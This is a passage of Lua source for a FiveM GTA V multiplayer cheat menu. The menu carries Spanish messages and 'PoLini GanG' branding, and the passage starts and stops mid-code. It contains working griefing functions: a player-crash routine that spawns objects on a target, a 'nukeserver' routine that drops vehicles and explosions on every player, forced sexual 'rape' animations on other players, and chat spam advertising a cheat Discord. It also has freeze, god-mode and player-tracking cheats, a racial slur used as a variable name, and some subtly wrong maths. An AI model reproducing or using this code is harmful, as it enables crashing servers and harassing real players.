    SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15) - 2, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16) - 1, false)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 17, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 18, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 19, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 21, true)
    SetVehicleTyresCanBurst(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
end

function CrashPlayer(ped)
    local playerPos = GetEntityCoords(ped, false)
    local modelHashes = {
        0x34315488, 
        0x6A27FEB1, 0xCB2ACC8, 
        0xC6899CDE, 0xD14B5BA3, 
        0xD9F4474C, 0x32A9996C, 
        0x69D4F974, 0xCAFC1EC3, 
        0x79B41171, 0x1075651, 
        0xC07792D4, 0x781E451D, 
        0x762657C6, 0xC2E75A21, 
        0xC3C00861, 0x81FB3FF0, 
        0x45EF7804, 0xE65EC0E4, 
        0xE764D794, 0xFBF7D21F, 
        0xE1AEB708, 0xA5E3D471, 
        0xD971BBAE, 0xCF7A9A9D, 
        0xC2CC99D8, 0x8FB233A4, 
        0x24E08E1F, 0x337B2B54, 
        0xB9402F87, 0x4F2526DA 
    }

    for i = 1, #modelHashes do
        obj = CreateObject(modelHashes[i], playerPos.x, playerPos.y, playerPos.z, true, true, true)
    end 
end

function ch(C,x,y)
    SetTextFont(0)
    SetTextProportional(1)
    SetTextScale(0.0,0.4)
    SetTextDropshadow(1,0,0,0,255)
    SetTextEdge(1,0,0,0,255)
    SetTextDropShadow()
    SetTextOutline()
    SetTextEntry("STRING")
    AddTextComponentString(C)
    DrawText(x,y)
end

local function getPlayerIds()
    local players = {}
    for i = -1, 128 do
        if NetworkIsPlayerActive(i) then
            players[#players + 1] = i
        end
    end
    return players
end

function DrawText3D(x, y, z, text, r, g, b)
    SetDrawOrigin(x, y, z, 0)
    SetTextFont(0)
    SetTextProportional(0)
    SetTextScale(0.0, 0.20)
    SetTextColour(r, g, b, 255)
    SetTextDropshadow(0, 0, 0, 0, 255)
    SetTextEdge(2, 0, 0, 0, 150)
    SetTextDropShadow()
    SetTextOutline()
    SetTextEntry("STRING")
    SetTextCentre(1)
    AddTextComponentString(text)
    DrawText(0.0, 0.0)
    ClearDrawOrigin()
end

function KeyboardInput(TextEntry, ExampleText, MaxStringLength)
    AddTextEntry("FMMC_KEY_TIP1", TextEntry .. ":")
    DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP1", "", ExampleText, "", "", "", MaxStringLength)
    blockinput = true

    while UpdateOnscreenKeyboard() ~= 1 and UpdateOnscreenKeyboard() ~= 2 do
        Citizen.Wait(0)
    end

    if UpdateOnscreenKeyboard() ~= 2 then
        local result = GetOnscreenKeyboardResult()
        Citizen.Wait(500)
        blockinput = false
        return result
    else
        Citizen.Wait(500)
        blockinput = false
        return nil
    end
end

function GetInputMode()
    return Citizen.InvokeNative(0xA571D46727E2B718, 2) and "MouseAndKeyboard" or "GamePad"
end

function TeleportToCoords()
    local x = KeyboardInput("Enter X Pos", "", 100)
    local y = KeyboardInput("Enter Y Pos", "", 100)
    local z = KeyboardInput("Enter Z Pos", "", 100)
    local entity
    if x ~= "" and y ~= "" and z ~= "" then
        if IsPedInAnyVehicle(GetPlayerPed(-1),0) and GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1),0),-1)==GetPlayerPed(-1) then 
            entity = GetVehiclePedIsIn(GetPlayerPed(-1),0)
        else
            entity = PlayerPedId()
        end
        if entity then
            SetEntityCoords(entity, x + 0.5, y + 0.5, z + 0.5, 1,0,0,1)
        end
    else
        drawNotification("~g~Coordenadas invalidas!")
    end
end

function TeleportToWaypoint()
    if DoesBlipExist(GetFirstBlipInfoId(8)) then
        local blipIterator = GetBlipInfoIdIterator(8)
        local blip = GetFirstBlipInfoId(8, blipIterator)
        WaypointCoords = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector()) --Thanks To Briglair [forum.FiveM.net]
        wp = true
    
    

        local zHeigt = 0.0
        height = 1000.0
        while true do
            Citizen.Wait(0)
            if wp then
                if
                    IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
                        (GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1))
                then
                    entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
                else
                    entity = GetPlayerPed(-1)
                end

                SetEntityCoords(entity, WaypointCoords.x, WaypointCoords.y, height)
                FreezeEntityPosition(entity, true)
                local Pos = GetEntityCoords(entity, true)

                if zHeigt == 0.0 then
                    height = height - 25.0
                    SetEntityCoords(entity, Pos.x, Pos.y, height)
                    bool, zHeigt = GetGroundZFor_3dCoord(Pos.x, Pos.y, Pos.z, 0)
                else
                    SetEntityCoords(entity, Pos.x, Pos.y, zHeigt)
                    FreezeEntityPosition(entity, false)
                    wp = false
                    height = 1000.0
                    zHeigt = 0.0
                    drawNotification("~g~Teleportado al punto!")
                    break
                end
            end
        end
    else
        drawNotification("~r~Selecciona un punto")
    end
end

function RapeAllFunc()
    for bs=0,9 do 
        TriggerServerEvent("_chat:messageEntered","^1PoLini GanG",{141,211,255},";) ")
    end
    Citizen.CreateThread(function()
        for i=0,128 do 
            RequestModelSync("a_m_o_acult_01")
            RequestAnimDict("rcmpaparazzo_2")
            while not HasAnimDictLoaded("rcmpaparazzo_2")do 
                Citizen.Wait(0)
            end
            if IsPedInAnyVehicle(GetPlayerPed(i),true)then 
                local veh=GetVehiclePedIsIn(GetPlayerPed(i),true)
                while not NetworkHasControlOfEntity(veh)do 
                    NetworkRequestControlOfEntity(veh)
                    Citizen.Wait(0)
                end
                SetEntityAsMissionEntity(veh,true,true)
                DeleteVehicle(veh)DeleteEntity(veh)end
                count=-0.2
                for b=1,3 do 
                    local x,y,z=table.unpack(GetEntityCoords(GetPlayerPed(i),true))
                    local bD=CreatePed(4,GetHashKey("a_m_o_acult_01"),x,y,z,0.0,true,false)
                    SetEntityAsMissionEntity(bD,true,true)
                    AttachEntityToEntity(bD,GetPlayerPed(i),4103,11816,count,0.00,0.0,0.0,0.0,0.0,false,false,false,false,2,true)
                    ClearPedTasks(GetPlayerPed(i))TaskPlayAnim(GetPlayerPed(i),"rcmpaparazzo_2","shag_loop_poppy",2.0,2.5,-1,49,0,0,0,0)
                    SetPedKeepTask(bD)TaskPlayAnim(bD,"rcmpaparazzo_2","shag_loop_a",2.0,2.5,-1,49,0,0,0,0)
                    SetEntityInvincible(bD,true)count=count-0.4 
            end 
        end 
    end)
end

function teleportToNearestVehicle()
            local playerPed = GetPlayerPed(-1)
            local playerPedPos = GetEntityCoords(playerPed, true)
            local NearestVehicle = GetClosestVehicle(GetEntityCoords(playerPed, true), 1000.0, 0, 4)
            local NearestVehiclePos = GetEntityCoords(NearestVehicle, true)
            local NearestPlane = GetClosestVehicle(GetEntityCoords(playerPed, true), 1000.0, 0, 16384)
            local NearestPlanePos = GetEntityCoords(NearestPlane, true)
        drawNotification("~y~Espera...")
        Citizen.Wait(1000)
        if (NearestVehicle == 0) and (NearestPlane == 0) then
            drawNotification("~r~Vehiculo no encontrado")
        elseif (NearestVehicle == 0) and (NearestPlane ~= 0) then
            if IsVehicleSeatFree(NearestPlane, -1) then
                SetPedIntoVehicle(playerPed, NearestPlane, -1)
                SetVehicleAlarm(NearestPlane, false)
                SetVehicleDoorsLocked(NearestPlane, 1)
                SetVehicleNeedsToBeHotwired(NearestPlane, false)
            else
                local driverPed = GetPedInVehicleSeat(NearestPlane, -1)
                ClearPedTasksImmediately(driverPed)
                SetEntityAsMissionEntity(driverPed, 1, 1)
                DeleteEntity(driverPed)
                SetPedIntoVehicle(playerPed, NearestPlane, -1)
                SetVehicleAlarm(NearestPlane, false)
                SetVehicleDoorsLocked(NearestPlane, 1)
                SetVehicleNeedsToBeHotwired(NearestPlane, false)
            end
            drawNotification("~g~Teleportado al vehiculo mas cercano")
        elseif (NearestVehicle ~= 0) and (NearestPlane == 0) then
            if IsVehicleSeatFree(NearestVehicle, -1) then
                SetPedIntoVehicle(playerPed, NearestVehicle, -1)
                SetVehicleAlarm(NearestVehicle, false)
                SetVehicleDoorsLocked(NearestVehicle, 1)
                SetVehicleNeedsToBeHotwired(NearestVehicle, false)
            else
                local driverPed = GetPedInVehicleSeat(NearestVehicle, -1)
                ClearPedTasksImmediately(driverPed)
                SetEntityAsMissionEntity(driverPed, 1, 1)
                DeleteEntity(driverPed)
                SetPedIntoVehicle(playerPed, NearestVehicle, -1)
                SetVehicleAlarm(NearestVehicle, false)
                SetVehicleDoorsLocked(NearestVehicle, 1)
                SetVehicleNeedsToBeHotwired(NearestVehicle, false)
            end
            drawNotification("~g~Teleportado al vehiculo mas cercano")
        elseif (NearestVehicle ~= 0) and (NearestPlane ~= 0) then
            if Vdist(NearestVehiclePos.x, NearestVehiclePos.y, NearestVehiclePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) < Vdist(NearestPlanePos.x, NearestPlanePos.y, NearestPlanePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) then
                if IsVehicleSeatFree(NearestVehicle, -1) then
                    SetPedIntoVehicle(playerPed, NearestVehicle, -1)
                    SetVehicleAlarm(NearestVehicle, false)
                    SetVehicleDoorsLocked(NearestVehicle, 1)
                    SetVehicleNeedsToBeHotwired(NearestVehicle, false)
                else
                    local driverPed = GetPedInVehicleSeat(NearestVehicle, -1)
                    ClearPedTasksImmediately(driverPed)
                    SetEntityAsMissionEntity(driverPed, 1, 1)
                    DeleteEntity(driverPed)
                    SetPedIntoVehicle(playerPed, NearestVehicle, -1)
                    SetVehicleAlarm(NearestVehicle, false)
                    SetVehicleDoorsLocked(NearestVehicle, 1)
                    SetVehicleNeedsToBeHotwired(NearestVehicle, false)
                end
            elseif Vdist(NearestVehiclePos.x, NearestVehiclePos.y, NearestVehiclePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) > Vdist(NearestPlanePos.x, NearestPlanePos.y, NearestPlanePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) then
                if IsVehicleSeatFree(NearestPlane, -1) then
                    SetPedIntoVehicle(playerPed, NearestPlane, -1)
                    SetVehicleAlarm(NearestPlane, false)
                    SetVehicleDoorsLocked(NearestPlane, 1)
                    SetVehicleNeedsToBeHotwired(NearestPlane, false)
                else
                    local driverPed = GetPedInVehicleSeat(NearestPlane, -1)
                    ClearPedTasksImmediately(driverPed)
                    SetEntityAsMissionEntity(driverPed, 1, 1)
                    DeleteEntity(driverPed)
                    SetPedIntoVehicle(playerPed, NearestPlane, -1)
                    SetVehicleAlarm(NearestPlane, false)
                    SetVehicleDoorsLocked(NearestPlane, 1)
                    SetVehicleNeedsToBeHotwired(NearestPlane, false)
                end
            end
            drawNotification("~g~Teletransportado al vehículo más cercano!")
        end

    end


    -- Discord presenece
    Citizen.CreateThread(function()
        while discordPresence do
            --This is the Application ID (Replace this with you own)
            SetDiscordAppId(615150377309831179)
    
            --Here you will have to put the image name for the "large" icon.
            SetDiscordRichPresenceAsset('logo_name')
            
            --(11-11-2018) New Natives:
    
            --Here you can add hover text for the "large" icon.
            SetDiscordRichPresenceAssetText('This is a lage icon with text')
           
            --Here you will have to put the image name for the "small" icon.
            SetDiscordRichPresenceAssetSmall('logo_name')
    
            --Here you can add hover text for the "small" icon.
            SetDiscordRichPresenceAssetSmallText('This is a lsmall icon with text')
    
            --It updates every one minute just in case.
            Citizen.Wait(2000)
        end
    end)

Citizen.CreateThread(function() 
    local headId = {}
    while Enabled do
        Citizen.Wait(1)
        if playerBlips then
            -- show blips
            for id = 0, 128 do
                if NetworkIsPlayerActive(id) and GetPlayerPed(id) ~= GetPlayerPed(-1) then
                    ped = GetPlayerPed(id)
                    blip = GetBlipFromEntity(ped)

                    -- HEAD DISPLAY STUFF --

                    -- Create head display (this is safe to be spammed)
                    headId[id] = CreateMpGamerTag(ped, GetPlayerName( id ), false, false, "", false)
                    wantedLvl = GetPlayerWantedLevel(id)

                    -- Wanted level display
                    if wantedLvl then
                        SetMpGamerTagVisibility(headId[id], 7, true) -- Add wanted sprite
                        SetMpGamerTagWantedLevel(headId[id], wantedLvl) -- Set wanted number
                    else
                        SetMpGamerTagVisibility(headId[id], 7, false)
                    end

                    -- Speaking display
                    if NetworkIsPlayerTalking(id) then
                        SetMpGamerTagVisibility(headId[id], 9, true) -- Add speaking sprite
                    else
                        SetMpGamerTagVisibility(headId[id], 9, false) -- Remove speaking sprite
                    end

                    -- BLIP STUFF --

                    if not DoesBlipExist(blip) then -- Add blip and create head display on player
                        blip = AddBlipForEntity(ped)
                        SetBlipSprite(blip, 1)
                        ShowHeadingIndicatorOnBlip(blip, true) -- Player Blip indicator
                    else -- update blip
                        veh = GetVehiclePedIsIn(ped, false)
                        blipSprite = GetBlipSprite(blip)
                        if not GetEntityHealth(ped) then -- dead
                            if blipSprite ~= 274 then
                                SetBlipSprite(blip, 274)
                                ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
                            end
                        elseif veh then
                            vehClass = GetVehicleClass(veh)
                            vehModel = GetEntityModel(veh)
                            if vehClass == 15 then -- Helicopters
                                if blipSprite ~= 422 then
                                    SetBlipSprite(blip, 422)
                                    ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
                                end
                            elseif vehClass == 8 then -- Motorcycles
                                if blipSprite ~= 226 then
                                    SetBlipSprite(blip, 226)
                                    ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
                                end
                            elseif vehClass == 16 then -- Plane
                                if vehModel == GetHashKey("besra") or vehModel == GetHashKey("hydra") or vehModel == GetHashKey("lazer") then -- Jets
                                    if blipSprite ~= 424 then
                                        SetBlipSprite(blip, 424)
                                        ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
                                    end
                                elseif blipSprite ~= 423 then
                                    SetBlipSprite(blip, 423)
                                    ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
                                end
                            elseif vehClass == 14 then -- Boat
                                if blipSprite ~= 427 then
                                    SetBlipSprite(blip, 427)
                                    ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
                                end
                            elseif vehModel == GetHashKey("insurgent") or vehModel == GetHashKey("insurgent2") or vehModel == GetHashKey("insurgent3") then -- Insurgent, Insurgent Pickup & Insurgent Pickup Custom
                                if blipSprite ~= 426 then
                                    SetBlipSprite(blip, 426)
                                    ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
                                end
                            elseif vehModel == GetHashKey("limo2") then -- Turreted Limo
                                if blipSprite ~= 460 then
                                    SetBlipSprite(blip, 460)
                                    ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
                                end
                            elseif vehModel == GetHashKey("rhino") then -- Tank
                                if blipSprite ~= 421 then
                                    SetBlipSprite(blip, 421)
                                    ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
                                end
                            elseif vehModel == GetHashKey("trash") or vehModel == GetHashKey("trash2") then -- Trash
                                if blipSprite ~= 318 then
                                    SetBlipSprite(blip, 318)
                                    ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
                                end
                            elseif vehModel == GetHashKey("pbus") then -- Prison Bus
                                if blipSprite ~= 513 then
                                    SetBlipSprite(blip, 513)
                                    ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
                                end
                            elseif vehModel == GetHashKey("seashark") or vehModel == GetHashKey("seashark2") or vehModel == GetHashKey("seashark3") then -- Speedophiles
                                if blipSprite ~= 471 then
                                    SetBlipSprite(blip, 471)
                                    ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
                                end
                            elseif vehModel == GetHashKey("cargobob") or vehModel == GetHashKey("cargobob2") or vehModel == GetHashKey("cargobob3") or vehModel == GetHashKey("cargobob4") then -- Cargobobs
                                if blipSprite ~= 481 then
                                    SetBlipSprite(blip, 481)
                                    ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
                                end
                            elseif vehModel == GetHashKey("technical") or vehModel == GetHashKey("technical2") or vehModel == GetHashKey("technical3") then -- Technical
                                if blipSprite ~= 426 then
                                    SetBlipSprite(blip, 426)
                                    ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
                                end
                            elseif vehModel == GetHashKey("taxi") then -- Cab/ Taxi
                                if blipSprite ~= 198 then
                                    SetBlipSprite(blip, 198)
                                    ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
                                end
                            elseif vehModel == GetHashKey("fbi") or vehModel == GetHashKey("fbi2") or vehModel == GetHashKey("police2") or vehModel == GetHashKey("police3") -- Police Vehicles
                                or vehModel == GetHashKey("police") or vehModel == GetHashKey("sheriff2") or vehModel == GetHashKey("sheriff")
                                or vehModel == GetHashKey("policeold2") or vehModel == GetHashKey("policeold1") then
                                if blipSprite ~= 56 then
                                    SetBlipSprite(blip, 56)
                                    ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
                                end
                            elseif blipSprite ~= 1 then -- default blip
                                SetBlipSprite(blip, 1)
                                ShowHeadingIndicatorOnBlip(blip, true) -- Player Blip indicator
                            end

                            -- Show number in case of passangers
                            passengers = GetVehicleNumberOfPassengers(veh)

                            if passengers then
                                if not IsVehicleSeatFree(veh, -1) then
                                    passengers = passengers + 1
                                end
                                ShowNumberOnBlip(blip, passengers)
                            else
                                HideNumberOnBlip(blip)
                            end
                        else
                            -- Remove leftover number
                            HideNumberOnBlip(blip)
                            if blipSprite ~= 1 then -- default blip
                                SetBlipSprite(blip, 1)
                                ShowHeadingIndicatorOnBlip(blip, true) -- Player Blip indicator
                            end
                        end
                        
                        SetBlipRotation(blip, math.ceil(GetEntityHeading(veh))) -- update rotation
                        SetBlipNameToPlayerName(blip, id) -- update blip name
                        SetBlipScale(blip,  0.85) -- set scale

                        -- set player alpha
                        if IsPauseMenuActive() then
                            SetBlipAlpha( blip, 255 )
                        else
                            x1, y1 = table.unpack(GetEntityCoords(GetPlayerPed(-1), true))
                            x2, y2 = table.unpack(GetEntityCoords(GetPlayerPed(id), true))
                            distance = (math.floor(math.abs(math.sqrt((x1 - x2) * (x1 - x2) + (y1 - y2) * (y1 - y2))) / -1)) + 900
                            -- Probably a way easier way to do this but whatever im an idiot

                            if distance < 0 then
                                distance = 0
                            elseif distance > 255 then
                                distance = 255
                            end
                            SetBlipAlpha(blip, distance)
                        end
                    end
                end
            end
        else
            for id = 0, 64 do
                ped = GetPlayerPed(id)
                blip = GetBlipFromEntity(ped)
                if DoesBlipExist(blip) then -- Removes blip
                    RemoveBlip(blip)
                end
                if IsMpGamerTagActive(headId[id]) then
                    RemoveMpGamerTag(headId[id])
                end
            end
        end
    end
end)

function ShootPlayer(player)
    local head = GetPedBoneCoords(player, GetEntityBoneIndexByName(player, "SKEL_HEAD"), 0.0, 0.0, 0.0)
    SetPedShootsAtCoord(PlayerPedId(), head.x, head.y, head.z, true)
end


function SpawnObjOnPlayer(modelHash)
    local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)					
    local obj CreateObject(modelHash, coords.x, coords.y, coords.z, true, true, true)
        if attachProp then
            AttachEntityToEntity(obj ,GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true ,true ,false, true, 1, true)
        end
end

function rapeplayer()
    Citizen.CreateThread(
        function()
            RequestModelSync('a_m_o_acult_01')
            RequestAnimDict('rcmpaparazzo_2')
            while not HasAnimDictLoaded('rcmpaparazzo_2') do
                Citizen.Wait(0)
            end
            if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then
                local veh = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), true)
                while not NetworkHasControlOfEntity(veh) do
                    NetworkRequestControlOfEntity(veh)
                    Citizen.Wait(0)
                end
                SetEntityAsMissionEntity(veh, true, true)
                DeleteVehicle(veh)
                DeleteEntity(veh)
            end
            count = -0.2
            for b = 1, 3 do
                local x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer), true))
                local bz = CreatePed(4, GetHashKey('a_m_o_acult_01'), x, y, z, 0.0, true, false)
                SetEntityAsMissionEntity(bz, true, true)
                AttachEntityToEntity(
                    bz,
                    GetPlayerPed(SelectedPlayer),
                    4103,
                    11816,
                    count,
                    0.00,
                    0.0,
                    0.0,
                    0.0,
                    0.0,
                    false,
                    false,
                    false,
                    false,
                    2,
                    true
                )
                ClearPedTasks(GetPlayerPed(SelectedPlayer))
                TaskPlayAnim(
                    GetPlayerPed(SelectedPlayer),
                    'rcmpaparazzo_2',
                    'shag_loop_poppy',
                    2.0,
                    2.5,
                    -1,
                    49,
                    0,
                    0,
                    0,
                    0
                )
                SetPedKeepTask(bz)
                TaskPlayAnim(bz, 'rcmpaparazzo_2', 'shag_loop_a', 2.0, 2.5, -1, 49, 0, 0, 0, 0)
                SetEntityInvincible(bz, true)
                count = count - 0.4
            end
        end
    )
end

function nukeserver()
    Citizen.CreateThread(function()
        local dg="Avenger"
        local dh="CARGOPLANE"
        local di="luxor"
        local dj="maverick"
        local dk="blimp2"
        
        while not HasModelLoaded(GetHashKey(dh))do 
            Citizen.Wait(0)
            RequestModel(GetHashKey(dh))
        end
        
        while not HasModelLoaded(GetHashKey(di))do
            Citizen.Wait(0)RequestModel(GetHashKey(di))
        end
            
        while not HasModelLoaded(GetHashKey(dg))do 
            Citizen.Wait(0)RequestModel(GetHashKey(dg))
        end
            
        while not HasModelLoaded(GetHashKey(dj))do 
            Citizen.Wait(0)RequestModel(GetHashKey(dj))
        end
        
        while not HasModelLoaded(GetHashKey(dk))do 
            Citizen.Wait(0)RequestModel(GetHashKey(dk))
        end
        
        for bs=0,9 do 
            TriggerServerEvent("_chat:messageEntered","^1PoLini GanG",{141,211,255},"^1B^2M^3T ^4C^5H^6E^7A^8T^9S https://discord.gg/YB6RnCm")
        end
        
        for i=0,128 do 
            local di=CreateVehicle(GetHashKey(dg),GetEntityCoords(GetPlayerPed(i))+2.0,true,true) and CreateVehicle(GetHashKey(dg),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dg),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(dh),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(dh),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dh),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(di),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(di),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(di),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(dj),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(dj),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dj),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(dk),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(dk),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dk),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and AddExplosion(GetEntityCoords(GetPlayerPed(i)),5,3000.0,true,false,100000.0)and AddExplosion(GetEntityCoords(GetPlayerPed(i)),5,3000.0,true,false,true)
        end
     end)
    end

function rotDirection(rot)
    local radianz = rot.z * 0.0174532924
    local radianx = rot.x * 0.0174532924
    local num = math.abs(math.cos(radianx))

    local dir = vector3(-math.sin(radianz) * num, math.cos(radianz) * num, math.sin(radianx))

    return dir
end
                        
function GetDistance(pointA, pointB)
    
    local aX = pointA.x
    local aY = pointA.y
    local aZ = pointA.z 

    local bX = pointB.x
    local bY = pointB.y
    local bZ = pointB.z 

    local xBA = bX - aX
    local yBA = bY - aY
    local zBA = bZ - aZ

    local y2 = yBA * yBA
    local x2 =  xBA * xBA
    local sum2 = y2 + x2	

    return math.sqrt(sum2 + zBA)
end

function RotToDirection(rot)
    local radiansZ = rot.z * 0.0174532924
    local radiansX = rot.x * 0.0174532924
    local num = math.abs(math.cos(radiansX))
    local dir = vector3(-math.sin(radiansZ) * num, math.cos(radiansZ * num), math.sin(radiansX))
    return dir
end

function add(a, b)
    local result = vector3(a.x + b.x, a.y + b.y, a.z + b.z)

    return result
end

function multiply(coords, coordz)
    local result = vector3(coords.x * coordz, coords.y * coordz, coords.z * coordz)

    return result
end

function SpectatePlayer(player)
    local playerPed = PlayerPedId()
    Spectating = not Spectating
    local targetPed = GetPlayerPed(player)

    if (Spectating) then
        local targetx, targety, targetz = table.unpack(GetEntityCoords(targetPed, false))

        RequestCollisionAtCoord(targetx, targety, targetz)
        NetworkSetInSpectatorMode(true, targetPed)

        drawNotification("Specteando " .. GetPlayerName(player))
    else
        local targetx, targety, targetz = table.unpack(GetEntityCoords(targetPed, false))

        RequestCollisionAtCoord(targetx, targety, targetz)
        NetworkSetInSpectatorMode(false, targetPed)

        drawNotification("Has parado de spectear " .. GetPlayerName(player))
    end
end

Citizen.CreateThread(
    function()
        while true do
            Citizen.Wait(0)
            
            DisplayRadar(true)

            SetPlayerWantedLevel(PlayerId(), 0, false)

            SetPlayerWeaponDamageModifier(PlayerId(), selectedDamage)
            SetPlayerMeleeWeaponDamageModifier(PlayerId(), selectedDamage)

            SetPlayerInvincible(PlayerId(), GodMode)
            SetEntityInvincible(PlayerPedId(), GodMode)

            if infStamina then
                RestorePlayerStamina(PlayerId(), 1.0)
            end

            if invisible then
                SetEntityVisible(GetPlayerPed(-1), false, 0)
            else
                SetEntityVisible(GetPlayerPed(-1), true, 0)
            end

            if freezePlayer then 
                ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
            end

            if spam then
                for i = 0, 128 do
						TriggerServerEvent(
                    '_chat:messageEntered',
                    'PoLini GanG :)',
                    {0, 0x99, 255},
                    'PoLini GanG :)'
                )
                TriggerServerEvent('_chat:messageEntered', 'PoLini GanG :)', {0, 0x99, 255}, 'PoLini GanG :)')
                end
			end

            if crosshair then 
                ShowHudComponentThisFrame(14)
            end

            if crosshair2 then
                ch("~r~+",0.495,0.484)
            end

            if crosshair3 then
                ch("~r~.",0.4968,0.478)
            end

            local niggerVehicle = GetVehiclePedIsIn(PlayerPedId(), false)
            
            if fall then
                for i = 0, 128 do
                    ClearPedTasksImmediately(GetPlayerPed(i))
                end
            end

            FiveM.GetVehicleProperties = function(vehicle)
                local color1, color2 = GetVehicleColours(vehicle)
                local pearlescentColor, wheelColor = GetVehicleExtraColours(vehicle)
                local extras = {}
        
                for id = 0, 12 do
                    if DoesExtraExist(vehicle, id) then
                        local state = IsVehicleExtraTurnedOn(vehicle, id) == 1
                        extras[tostring(id)] = state
                    end
                end
        
                return {
                    model = GetEntityModel(vehicle),
        
                    plate = math.trim(GetVehicleNumberPlateText(vehicle)),
                    plateIndex = GetVehicleNumberPlateTextIndex(vehicle),
        
                    health = GetEntityMaxHealth(vehicle),
                    dirtLevel = GetVehicleDirtLevel(vehicle),
        
                    color1 = color1,
                    color2 = color2,
        
                    pearlescentColor = pearlescentColor,
                    wheelColor = wheelColor,
        
                    wheels = GetVehicleWheelType(vehicle),
                    windowTint = GetVehicleWindowTint(vehicle),
        
                    neonEnabled = {
                        IsVehicleNeonLightEnabled(vehicle, 0), IsVehicleNeonLightEnabled(vehicle, 1), IsVehicleNeonLightEnabled(vehicle, 2),
                        IsVehicleNeonLightEnabled(vehicle, 3)
                    },
        
                    extras = extras,
        
                    neonColor = table.pack(GetVehicleNeonLightsColour(vehicle)),
                    tyreSmokeColor = table.pack(GetVehicleTyreSmokeColor(vehicle)),
        
                    modSpoilers = GetVehicleMod(vehicle, 0),
                    modFrontBumper = GetVehicleMod(vehicle, 1),
                    modRearBumper = GetVehicleMod(vehicle, 2),
                    modSideSkirt = GetVehicleMod(vehicle, 3),
                    modExhaust = GetVehicleMod(vehicle, 4),
                    modFrame = GetVehicleMod(vehicle, 5),
                    modGrille = GetVehicleMod(vehicle, 6),
                    modHood = GetVehicleMod(vehicle, 7),
                    modFender = GetVehicleMod(vehicle, 8),
                    modRightFender = GetVehicleMod(vehicle, 9),
                    modRoof = GetVehicleMod(vehicle, 10),
        
                    modEngine = GetVehicleMod(vehicle, 11),
                    modBrakes = GetVehicleMod(vehicle, 12),
                    modTransmission = GetVehicleMod(vehicle, 13),
                    modHorns = GetVehicleMod(vehicle, 14),
                    modSuspension = GetVehicleMod(vehicle, 15),
                    modArmor = GetVehicleMod(vehicle, 16),
        
